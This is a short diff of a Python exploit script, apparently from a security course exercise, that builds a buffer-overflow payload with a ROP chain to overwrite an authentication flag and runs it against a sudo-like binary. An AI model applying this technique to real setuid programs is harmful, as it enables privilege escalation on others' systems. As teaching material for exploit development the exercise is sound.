@@ -43,17 +43,12 @@ def get_arg() -> bytes:
     addr_rop_chain_part_1 = search.find(POP_EAX)
     addr_rop_chain_part_2 = search.find(POP_EDI)
     addr_rop_chain_part_3 = search.find(STOSD)
+    # padding then assign eax to patched value and the address to patch
+    # and patch the address
     encoded_payload = ("A" * (0x8E - 11) + "B" * 4).encode('latin1') + addresses.address_to_bytes(addr_rop_chain_part_1) + addresses.address_to_bytes(PATCHED_AUTH) + addresses.address_to_bytes(addr_rop_chain_part_2) + addresses.address_to_bytes(addresses.AUTH) + addresses.address_to_bytes(addr_rop_chain_part_3) + addresses.address_to_bytes(addresses.ORIGIN_RET_ADDR)
     return encoded_payload
 
-def main(argv):
-    # WARNING: DON'T EDIT THIS FUNCTION!
-    # NOTE: os.execl() accepts `bytes` as well as `str`, so we will use `bytes`.
-    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, base64.b64encode(get_arg()))
 
-
-if __name__ == '__main__':
-    main(sys.argv)
 def main(argv):
     # WARNING: DON'T EDIT THIS FUNCTION!
     # NOTE: os.execl() accepts `bytes` as well as `str`, so we will use `bytes`.
